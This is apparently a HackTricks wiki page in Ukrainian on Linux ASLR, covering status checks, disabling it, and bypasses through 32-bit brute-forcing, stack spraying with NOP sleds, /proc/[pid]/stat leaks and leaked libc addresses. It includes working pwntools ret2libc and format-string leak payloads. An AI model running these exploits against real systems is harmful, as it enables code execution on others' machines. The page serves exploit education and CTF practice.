# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Address Space Layout Randomization (ASLR)** - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –±–µ–∑–ø–µ–∫–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –¥–ª—è **–≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è –∞–¥—Ä–µ—Å –ø–∞–º'—è—Ç—ñ**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Å–∏—Å—Ç–µ–º–Ω–∏–º–∏ —Ç–∞ –ø—Ä–∏–∫–ª–∞–¥–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å–∞–º–∏. –¶–µ —É—Å–∫–ª–∞–¥–Ω—é—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–µ—Ä–µ–¥–±–∞—á–∏—Ç–∏ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤ —ñ –¥–∞–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ —Å—Ç–µ–∫, –∫—É–ø–∞ —Ç–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —â–æ –∑–º–µ–Ω—à—É—î —Ä–∏–∑–∏–∫ –ø–µ–≤–Ω–∏—Ö —Ç–∏–ø—ñ–≤ –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, –∑–æ–∫—Ä–µ–º–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω—å –±—É—Ñ–µ—Ä–∞.

### **Checking ASLR Status**

–©–æ–± **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏** —Å—Ç–∞—Ç—É—Å ASLR –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ Linux, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ —Ñ–∞–π–ª—É **`/proc/sys/kernel/randomize_va_space`**. –ó–Ω–∞—á–µ–Ω–Ω—è, –∑–±–µ—Ä–µ–∂–µ–Ω–µ –≤ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ, –≤–∏–∑–Ω–∞—á–∞—î —Ç–∏–ø ASLR, —â–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è:

* **0**: –ù–µ–º–∞—î –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è. –í—Å–µ —Å—Ç–∞—Ç–∏—á–Ω–µ.
* **1**: –ö–æ–Ω—Å–µ—Ä–≤–∞—Ç–∏–≤–Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è. –°–ø—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Å—Ç–µ–∫, mmap(), —Å—Ç–æ—Ä—ñ–Ω–∫–∞ VDSO –≤–∏–ø–∞–¥–∫–æ–≤—ñ.
* **2**: –ü–æ–≤–Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è. –ù–∞ –¥–æ–¥–∞—Ç–æ–∫ –¥–æ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, –≤–∏–ø–∞–¥–∫–æ–≤–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω—Å–µ—Ä–≤–∞—Ç–∏–≤–Ω–æ–≥–æ –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è, –ø–∞–º'—è—Ç—å, –∫–µ—Ä–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ `brk()`, —Ç–∞–∫–æ–∂ –≤–∏–ø–∞–¥–∫–æ–≤–∞.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å—Ç–∞—Ç—É—Å ASLR –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **–í–∏–º–∫–Ω–µ–Ω–Ω—è ASLR**

–©–æ–± **–≤–∏–º–∫–Ω—É—Ç–∏** ASLR, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `/proc/sys/kernel/randomize_va_space` –Ω–∞ **0**. –í–∏–º–∫–Ω–µ–Ω–Ω—è ASLR –∑–∞–∑–≤–∏—á–∞–π –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –ø–æ–∑–∞ —Å—Ü–µ–Ω–∞—Ä—ñ—è–º–∏ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –∞–±–æ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è. –û—Å—å —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –π–æ–≥–æ –≤–∏–º–∫–Ω—É—Ç–∏:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–º–∫–Ω—É—Ç–∏ ASLR –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **–£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è ASLR**

–©–æ–± **—É–≤—ñ–º–∫–Ω—É—Ç–∏** ASLR, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Å–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è **2** —É —Ñ–∞–π–ª `/proc/sys/kernel/randomize_va_space`. –¶–µ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–º–∞–≥–∞—î –ø—Ä–∞–≤ root. –£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è –ø–æ–≤–Ω–æ—ó —Ä–∞–Ω–¥–æ–º—ñ–∑–∞—Ü—ñ—ó –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **–°—Ç—ñ–π–∫—ñ—Å—Ç—å –ø—ñ–¥ —á–∞—Å –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å**

–ó–º—ñ–Ω–∏, –≤–Ω–µ—Å–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥ `echo`, —î —Ç–∏–º—á–∞—Å–æ–≤–∏–º–∏ —ñ –±—É–¥—É—Ç—å —Å–∫–∏–Ω—É—Ç—ñ –ø—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è. –©–æ–± –∑—Ä–æ–±–∏—Ç–∏ –∑–º—ñ–Ω–∏ –ø–æ—Å—Ç—ñ–π–Ω–∏–º–∏, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —Ñ–∞–π–ª `/etc/sysctl.conf` —ñ –¥–æ–¥–∞—Ç–∏ –∞–±–æ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
–ü—ñ—Å–ª—è —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è `/etc/sysctl.conf`, –∑–∞—Å—Ç–æ—Å—É–π—Ç–µ –∑–º—ñ–Ω–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
sudo sysctl -p
```
–¶–µ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –≤–∞—à–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å ASLR –ø—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

## **–û–±—Ö–æ–¥–∏**

### 32-–±—ñ—Ç–Ω–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥

PaX –¥—ñ–ª–∏—Ç—å –∞–¥—Ä–µ—Å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ **3 –≥—Ä—É–ø–∏**:

* **–ö–æ–¥ —ñ –¥–∞–Ω—ñ** (—ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ —Ç–∞ –Ω–µ—ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ): `.text`, `.data` —Ç–∞ `.bss` ‚Äî> **16 –±—ñ—Ç** –µ–Ω—Ç—Ä–æ–ø—ñ—ó –≤ –∑–º—ñ–Ω–Ω—ñ–π `delta_exec`. –¶—è –∑–º—ñ–Ω–Ω–∞ –≤–∏–ø–∞–¥–∫–æ–≤–∏–º —á–∏–Ω–æ–º —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è –∑ –∫–æ–∂–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–æ–º —ñ –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ –ø–æ—á–∞—Ç–∫–æ–≤–∏—Ö –∞–¥—Ä–µ—Å.
* **–ü–∞–º'—è—Ç—å**, –≤–∏–¥—ñ–ª–µ–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `mmap()`, —Ç–∞ **—Å–ø—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** ‚Äî> **16 –±—ñ—Ç**, –Ω–∞–∑–≤–∞–Ω—ñ `delta_mmap`.
* **–°—Ç–µ–∫** ‚Äî> **24 –±—ñ—Ç–∏**, —â–æ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è `delta_stack`. –û–¥–Ω–∞–∫, —Ñ–∞–∫—Ç–∏—á–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **11 –±—ñ—Ç** (–∑ 10-–≥–æ –¥–æ 20-–≥–æ –±–∞–π—Ç–∞ –≤–∫–ª—é—á–Ω–æ), –≤–∏—Ä—ñ–≤–Ω—è–Ω–∏—Ö –Ω–∞ **16 –±–∞–π—Ç** ‚Äî> –¶–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **524,288 –º–æ–∂–ª–∏–≤–∏—Ö —Ä–µ–∞–ª—å–Ω–∏—Ö –∞–¥—Ä–µ—Å —Å—Ç–µ–∫—É**.

–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ –¥–∞–Ω—ñ —Å—Ç–æ—Å—É—é—Ç—å—Å—è 32-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º, –∞ –∑–º–µ–Ω—à–µ–Ω–∞ —Ñ—ñ–Ω–∞–ª—å–Ω–∞ –µ–Ω—Ç—Ä–æ–ø—ñ—è –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏ ASLR, –ø–æ–≤—Ç–æ—Ä—é—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–Ω–æ–≤—É —ñ –∑–Ω–æ–≤—É, –ø–æ–∫–∏ –µ–∫—Å–ø–ª–æ–π—Ç –Ω–µ –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è —É—Å–ø—ñ—à–Ω–æ.

#### –Ü–¥–µ—ó –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥—É:

* –Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–∏–π –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —â–æ–± –≤–º—ñ—Å—Ç–∏—Ç–∏ **–≤–µ–ª–∏–∫–∏–π NOP sled –ø–µ—Ä–µ–¥ shellcode**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –∞–¥—Ä–µ—Å–∏ –≤ —Å—Ç–µ–∫—É, –ø–æ–∫–∏ –ø–æ—Ç—ñ–∫ **–Ω–µ —Å—Ç—Ä–∏–±–Ω–µ —á–µ—Ä–µ–∑ —è–∫—É—Å—å —á–∞—Å—Ç–∏–Ω—É NOP sled**.
* –Ü–Ω—à–∞ –æ–ø—Ü—ñ—è –¥–ª—è —Ü—å–æ–≥–æ, —è–∫—â–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –Ω–µ —Ç–∞–∫–µ –≤–µ–ª–∏–∫–µ, –∞ –µ–∫—Å–ø–ª–æ–π—Ç –º–æ–∂–Ω–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–æ, ‚Äî —Ü–µ **–¥–æ–¥–∞—Ç–∏ NOP sled —ñ shellcode –≤ –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**.
* –Ø–∫—â–æ –µ–∫—Å–ø–ª–æ–π—Ç –ª–æ–∫–∞–ª—å–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É libc (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è 32-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* –Ø–∫—â–æ –≤–∏ –∞—Ç–∞–∫—É—î—Ç–µ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π —Å–µ—Ä–≤–µ—Ä, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó `libc` `usleep`**, –ø–µ—Ä–µ–¥–∞—é—á–∏ –≤ —è–∫–æ—Å—Ç—ñ –∞—Ä–≥—É–º–µ–Ω—Ç—É 10 (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥). –Ø–∫—â–æ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç **—Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ 10 —Å–µ–∫—É–Ω–¥ –¥–æ–≤—à–µ**, –≤–∏ –∑–Ω–∞–π—à–ª–∏ –∞–¥—Ä–µ—Å—É —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó.

{% hint style="success" %}
–í 64-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –µ–Ω—Ç—Ä–æ–ø—ñ—è –∑–Ω–∞—á–Ω–æ –≤–∏—â–∞, —ñ —Ü–µ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º.
{% endhint %}

### –ë—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥ —Å—Ç–µ–∫—É 64 –±—ñ—Ç–∏

–ú–æ–∂–ª–∏–≤–æ –∑–∞–π–Ω—è—Ç–∏ –≤–µ–ª–∏–∫—É —á–∞—Å—Ç–∏–Ω—É —Å—Ç–µ–∫—É –∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, –∞ –ø–æ—Ç—ñ–º —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–∫–æ–º —Å–æ—Ç–Ω—ñ/—Ç–∏—Å—è—á—ñ —Ä–∞–∑—ñ–≤ –ª–æ–∫–∞–ª—å–Ω–æ, —â–æ–± –π–æ–≥–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.\
–ù–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ –ø–æ–∫–∞–∑—É—î, —è–∫ –º–æ–∂–ª–∏–≤–æ **–ø—Ä–æ—Å—Ç–æ –≤–∏–±—Ä–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –≤ —Å—Ç–µ–∫—É** —ñ –∫–æ–∂–Ω—ñ **–∫—ñ–ª—å–∫–∞ —Å–æ—Ç–µ–Ω—å –≤–∏–∫–æ–Ω–∞–Ω—å** —Ü—è –∞–¥—Ä–µ—Å–∞ –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ **—ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é NOP**:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### –õ–æ–∫–∞–ª—å–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è (`/proc/[pid]/stat`)

–§–∞–π–ª **`/proc/[pid]/stat`** –ø—Ä–æ—Ü–µ—Å—É –∑–∞–≤–∂–¥–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –≤—Å—ñ–º —ñ **–º—ñ—Å—Ç–∏—Ç—å —Ü—ñ–∫–∞–≤—É** —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫:

* **startcode** & **endcode**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ –∑ **TEXT** –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É
* **startstack**: –ê–¥—Ä–µ—Å–∞ –ø–æ—á–∞—Ç–∫—É **—Å—Ç–µ–∫—É**
* **start\_data** & **end\_data**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è **BSS**
* **kstkesp** & **kstkeip**: –ü–æ—Ç–æ—á–Ω—ñ –∞–¥—Ä–µ—Å–∏ **ESP** —Ç–∞ **EIP**
* **arg\_start** & **arg\_end**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è **cli –∞—Ä–≥—É–º–µ–Ω—Ç–∏**.
* **env\_start** &**env\_end**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**.

–û—Ç–∂–µ, —è–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É –∂ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ, —â–æ –π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç—å—Å—è, —ñ —Ü–µ–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –æ—á—ñ–∫—É—î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –∑ —Å–∏—Ä–∏—Ö –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤, –∞ –∑ —ñ–Ω—à–æ–≥–æ **–≤—Ö–æ–¥—É, —è–∫–∏–π –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø—ñ—Å–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É**. –ê—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—ñ –∞–¥—Ä–µ—Å–∏ –∑ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É —ñ –ø–æ–±—É–¥—É–≤–∞—Ç–∏ –∑ –Ω–∏—Ö –æ—Ñ—Å–µ—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó**.

{% hint style="success" %}
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü–µ–π —Ñ–∞–π–ª –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html), —à—É–∫–∞—é—á–∏ `/proc/pid/stat`
{% endhint %}

### –ú–∞—é—á–∏ leak

* **–í–∏–∫–ª–∏–∫ –ø–æ–ª—è–≥–∞—î –≤ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ leak**

–Ø–∫—â–æ –≤–∞–º –Ω–∞–¥–∞–Ω–æ leak (–ª–µ–≥–∫—ñ CTF –∑–∞–≤–¥–∞–Ω–Ω—è), –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –æ—Ñ—Å–µ—Ç–∏ –∑ –Ω—å–æ–≥–æ (–ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ —Ç–æ—á–Ω—É –≤–µ—Ä—Å—ñ—é libc, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ —Å–∏—Å—Ç–µ–º—ñ, —è–∫—É –≤–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç–µ). –¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–∏—Ç—è–≥–Ω—É—Ç–æ –∑ [**–ø—Ä–∏–∫–ª–∞–¥—É –∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (–ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º –±—É—Ñ–µ—Ä–∞, –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ **ret2plt** –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ libc. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —É ret2plt, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ–≤—ñ–ª—å–Ω–µ —á–∏—Ç–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ñ–æ—Ä–º–∞—Ç–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤, –º–æ–∂–ª–∏–≤–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å—É **—Ñ—É–Ω–∫—Ü—ñ—ó libc** –∑ GOT. –ù–∞—Å—Ç—É–ø–Ω–∏–π [**–ø—Ä–∏–∫–ª–∞–¥ –∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ Format Strings arbitrary read —É:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

–°–ø—Ä–æ–±—É–π—Ç–µ –æ–±—ñ–π—Ç–∏ ASLR, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∞–¥—Ä–µ—Å–∞–º–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

